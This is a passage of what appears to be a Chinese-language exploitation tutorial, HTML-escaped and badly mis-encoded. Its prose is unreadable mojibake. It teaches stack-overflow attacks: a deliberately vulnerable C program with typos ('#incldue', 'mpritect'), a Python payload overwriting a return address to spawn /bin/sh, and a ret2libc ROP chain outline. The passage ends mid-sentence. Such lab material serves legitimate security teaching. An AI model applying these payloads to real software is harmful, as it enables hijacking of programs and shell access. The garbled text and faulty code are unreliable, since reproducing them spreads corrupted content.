&lt;/h2&gt;&lt;p&gt;å¦‚æœç¨‹åºä¸­æ²¡æœ‰systemè¿™æ ·çš„ä»£ç å‡ºç°ï¼Œæ€ä¹ˆåŠï¼Ÿæˆ‘ä»¬å¯ä»¥è‡ªå·±å†™shellcodeï¼&lt;/p&gt;
&lt;p&gt;**&lt;code&gt;shellcode&lt;/code&gt;**å°±æ˜¯ä¸€æ®µå¯ä»¥ç‹¬ç«‹å¼€å¯shellçš„ä¸€æ®µæ±‡ç¼–ä»£ç ã€‚&lt;/p&gt;
&lt;p&gt;ret2shellcodeçš„æ€è·¯å°±æ˜¯ï¼š&lt;/p&gt;
&lt;p&gt;å¦‚æœç¨‹åºä¸­å­˜åœ¨è®©ç”¨æˆ·å‘ä¸€æ®µé•¿åº¦è¶³å¤Ÿçš„ç¼“å†²åŒºä¸­è¾“å…¥æ•°æ®ã€‚æˆ‘ä»¬å‘å…¶ä¸­è¾“å…¥shellcodeï¼Œå°†ç¨‹åºåŠ«æŒåˆ°shellcodeä¸Šå³å¯ã€‚å½“ç„¶ï¼Œè¿™ç§ä¹Ÿæ˜¯ç†æƒ³æƒ…å†µã€‚&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;ret2shellcode&lt;/code&gt;æ˜¯äºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨ä¸­çš„ä¸€ç§å¸¸è§æŠ€æœ¯ï¼Œç”¨äºåœ¨å­˜åœ¨æ ˆæº¢å‡ºç­‰æ¼æ´çš„ç¨‹åºä¸­è·å–ç³»ç»Ÿçš„ shell æƒé™ï¼Œä»è€Œæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚&lt;code&gt;ret2shellcode&lt;/code&gt;åˆ©ç”¨è¿™ä¸ªç‰¹æ€§ï¼Œå°†è¿”å›åœ°å€è¦†ç›–ä¸ºä¸€æ®µç²¾å¿ƒæ„é€ çš„æœºå™¨ç ï¼ˆå³ shellcodeï¼‰çš„åœ°å€ï¼Œä»è€Œè¿”å›åˆ°æ”»å‡»è€…ç•™ä¸‹çš„shellcodeè¿›è¡ŒåŠ«æŒã€‚&lt;/p&gt;&lt;/blockquote&gt;
&lt;h3 id=&#34;æ ˆæº¢å‡ºæ¡ˆä¾‹ret2shellcode&#34;&gt;æ ˆæº¢å‡ºæ¡ˆä¾‹ï¼šret2shellcode
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;#34;stdlib.h&amp;#34;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;#34;stdio.h&amp;#34;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#incldue &amp;#34;unistd.h&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;global_buf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;200&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;gen_shell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;execv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;/bin/sh&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;wow&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;vul&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;80&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;input:&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;read&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;200&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;done&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;mpritect&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x404000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;setvbuf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stdout&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;setvbuf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stdin&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;gen_shell:0x%x&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;unsigned&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;gen_shell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;global_buf:0x%x&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;unsigned&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;global_buf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;global:&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;read&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;global_buf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;200&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;vul&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;goodbye!&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;vulå‡½æ•°å­˜åœ¨æ˜æ˜¾çš„æ ˆæº¢å‡ºï¼Œå¯ä»¥åŠ«æŒæ§åˆ¶æµåˆ°gen_shellå‡½æ•°ã€å¯ä»¥åŠ«æŒæ§åˆ¶æµåˆ°global_bufã€‚&lt;/p&gt;
&lt;p&gt;å±€éƒ¨å˜é‡&lt;code&gt;buf[80]&lt;/code&gt;ä»…åˆ†é… 80 å­—èŠ‚ï¼Œä½†&lt;code&gt;read(0, buf, 200)&lt;/code&gt;è¯»å– 200 å­—èŠ‚è¾“å…¥ï¼Œè¶…å‡ºçš„ 120 å­—èŠ‚ä¼šè¦†ç›–æ ˆä¸­æ›´é«˜åœ°å€çš„æ•°æ®ï¼ˆåŒ…æ‹¬&lt;code&gt;ebp&lt;/code&gt;å’Œè¿”å›åœ°å€ï¼‰ï¼Œå±äºå…¸å‹çš„æ ˆæº¢å‡ºæ¼æ´ã€‚&lt;/p&gt;
&lt;h4 id=&#34;æ–¹æ³•ä¸€ç”Ÿæˆpayloadè„šæœ¬åŠ«æŒ&#34;&gt;æ–¹æ³•ä¸€ï¼šç”Ÿæˆpayloadè„šæœ¬åŠ«æŒ
&lt;/h4&gt;&lt;p&gt;vul()å‡½æ•°ä¸­ï¼Œbuf[80]æ˜¯å±€éƒ¨å˜é‡ï¼Œæ ˆå¸ƒå±€ä»ä½åˆ°é«˜ä¸ºï¼šbuf[0..79] â†’ ebpï¼ˆ4 å­—èŠ‚ï¼Œ32 ä½ç³»ç»Ÿï¼‰ â†’ è¿”å›åœ°å€ï¼ˆ4 å­—èŠ‚ï¼‰ã€‚&lt;/p&gt;
&lt;p&gt;è¦†ç›–è¿”å›åœ°å€éœ€è¦å…ˆå¡«å……ï¼š80å­—èŠ‚ï¼ˆbufï¼‰ + 4å­—èŠ‚ï¼ˆè¦†ç›–ebpï¼‰ï¼Œä¹‹åçš„ 4 å­—èŠ‚å°±æ˜¯è¦å†™å…¥çš„è¿”å›åœ°å€ï¼ˆå³gen_shellçš„åœ°å€ï¼‰ã€‚&lt;/p&gt;
&lt;p&gt;æ„é€ æ”»å‡»æ•°æ®ï¼ˆä»¥ Python ä¸ºä¾‹ï¼‰ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# å‡è®¾gen_shellåœ°å€ä¸º0x401120ï¼Œå°ç«¯åºä¸ºb&amp;#39;\x20\x11\x40\x00&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;80&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;B&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x20\x11\x40\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# è¾“å‡ºåˆ°ç¨‹åºè¾“å…¥&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;è¾“å…¥æ”»å‡»æ•°æ®åï¼Œ&lt;code&gt;vul()&lt;/code&gt;å‡½æ•°æ‰§è¡Œ&lt;code&gt;return&lt;/code&gt;æ—¶ï¼Œè¿”å›åœ°å€å·²è¢«è¦†ç›–ä¸º&lt;code&gt;0x401120&lt;/code&gt;ï¼Œç¨‹åºä¼šè·³è½¬åˆ°&lt;code&gt;gen_shell&lt;/code&gt;å‡½æ•°ï¼Œæ‰§è¡Œ&lt;code&gt;execv(&amp;quot;/bin/sh&amp;quot;, 0)&lt;/code&gt;ï¼ŒæˆåŠŸè·å– shellã€‚&lt;/p&gt;
&lt;h4 id=&#34;æ–¹æ³•äºŒåˆ©ç”¨æ ˆæº¢å‡ºè·³è½¬åˆ°shellcode&#34;&gt;æ–¹æ³•äºŒï¼šåˆ©ç”¨æ ˆæº¢å‡ºè·³è½¬åˆ°shellcode
&lt;/h4&gt;&lt;p&gt;æ„é€  payload è¦†ç›– &lt;code&gt;vul()&lt;/code&gt; å‡½æ•°çš„è¿”å›åœ°å€ä¸º &lt;code&gt;global_buf&lt;/code&gt; çš„åœ°å€ï¼ˆå³ shellcode æ‰€åœ¨ä½ç½®ï¼‰&amp;hellip;&amp;hellip;&lt;/p&gt;
&lt;h3 id=&#34;ret2libc&#34;&gt;ret2libc
&lt;/h3&gt;&lt;p&gt;æœ‰æ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦è°ƒç”¨ä¸€äº›ç³»ç»Ÿå‡½æ•°ï¼Œå°±æ¯”å¦‚è¯´systemæˆ–è€…execvç­‰ã€‚ç¨‹åºä¸­å¯èƒ½ä¸ä¼šæä¾›ä¸€äº›ç°æˆçš„å‡½æ•°ã€‚&lt;/p&gt;
&lt;p&gt;å¦‚æœæˆ‘ä»¬æ‹¿åˆ°äº†libcä¸­å‡½æ•°çš„åœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥è°ƒç”¨libcä¸­çš„å‡½æ•°ï¼Œåªéœ€è¦ä¼ é€’å¥½å‚æ•°ï¼Œç„¶åcallå³å¯ã€‚&lt;/p&gt;
&lt;p&gt;å¦‚ä½•ä¼ å‚ï¼Ÿå¦‚ä½•è°ƒç”¨&lt;code&gt;system(/bin/sh)&lt;/code&gt;ï¼Ÿ&lt;/p&gt;
&lt;p&gt;åªéœ€è¦å°†rdiè®¾ç½®ä¸º/bin/shå­—ç¬¦ä¸²åœ°å€ï¼Œç„¶åcall systemå³å¯ã€‚&lt;/p&gt;
&lt;p&gt;å¦‚ä½•è®¾ç½®movï¼Ÿ&lt;/p&gt;
&lt;p&gt;å¦‚æœç›´æ¥movï¼Œç„¶åcallï¼Œé‚£ä¹ˆå°±å’Œret2shellcodeæ— å¼‚ã€‚&lt;/p&gt;
&lt;p&gt;ç°åœ¨é—®é¢˜æ˜¯ï¼Œæˆ‘ä»¬åªæœ‰ä¸€ä¸ªlibcåœ°å€å’Œ/bin/shå­—ç¬¦ä¸²åœ°å€ï¼Œä»¥åŠä¸€ä¸ªæ ˆæº¢å‡ºæ¼æ´ï¼Œæ€ä¹ˆä¼ é€’å‚æ•°ï¼Ÿ&lt;/p&gt;
&lt;p&gt;pop rdi ret + /bin/shåœ°å€ + system&lt;/p&gt;
&lt;p&gt;æ¥ä¸ªä¾‹å­ï¼šæœ‰ä¸€ä¸ªå­˜åœ¨æ ˆæº¢å‡ºçš„ 64 ä½ç¨‹åº vuln&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;æœ‰ä¸€ä¸ªæ¼æ´å‡½æ•° &lt;code&gt;vul()&lt;/code&gt;ï¼Œå­˜åœ¨æ ˆæº¢å‡ºï¼ˆå¯è¦†ç›–è¿”å›åœ°å€ï¼‰ï¼›&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ç¨‹åºåŠ è½½äº† libc åº“ï¼ˆå¿…ç„¶åŒ…å« &lt;code&gt;system&lt;/code&gt; å‡½æ•°ï¼‰ï¼›&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æˆ‘ä»¬é€šè¿‡ä¿¡æ¯æ³„éœ²å·²ç»è·å–åˆ°ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;system&lt;/code&gt; å‡½æ•°åœ¨å†…å­˜ä¸­çš„åœ°å€ï¼š&lt;code&gt;0x7ffff7839410&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;quot;/bin/sh&amp;quot;&lt;/code&gt; å­—ç¬¦ä¸²åœ¨å†…å­˜ä¸­çš„åœ°å€ï¼š&lt;code&gt;0x7ffff79e5aaa&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;ä¸€ä¸ª &lt;code&gt;pop rdi; ret&lt;/code&gt; gadget çš„åœ°å€ï¼š&lt;code&gt;0x401273&lt;/code&gt;ï¼ˆä»ç¨‹åºä¸­æ‰¾åˆ°ï¼‰&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ç»è°ƒè¯•ï¼Œè¦†ç›– &lt;code&gt;vul()&lt;/code&gt; å‡½æ•°è¿”å›åœ°å€éœ€è¦å…ˆå¡«å…… &lt;strong&gt;120 å­—èŠ‚&lt;/strong&gt;ï¼ˆå‰ 120 å­—èŠ‚ä¼šè¦†ç›–å±€éƒ¨å˜é‡å’Œ &lt;code&gt;rbp&lt;/code&gt;ï¼‰ã€‚&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;å‡½æ•°çš„&lt;strong&gt;ç¬¬ä¸€ä¸ªå‚æ•°&lt;/strong&gt;é€šè¿‡ &lt;code&gt;rdi&lt;/code&gt; å¯„å­˜å™¨ä¼ é€’ã€‚å› æ­¤è°ƒç”¨ &lt;code&gt;system(&amp;quot;/bin/sh&amp;quot;)&lt;/code&gt; å¿…é¡»æ»¡è¶³ï¼š&lt;/p&gt;
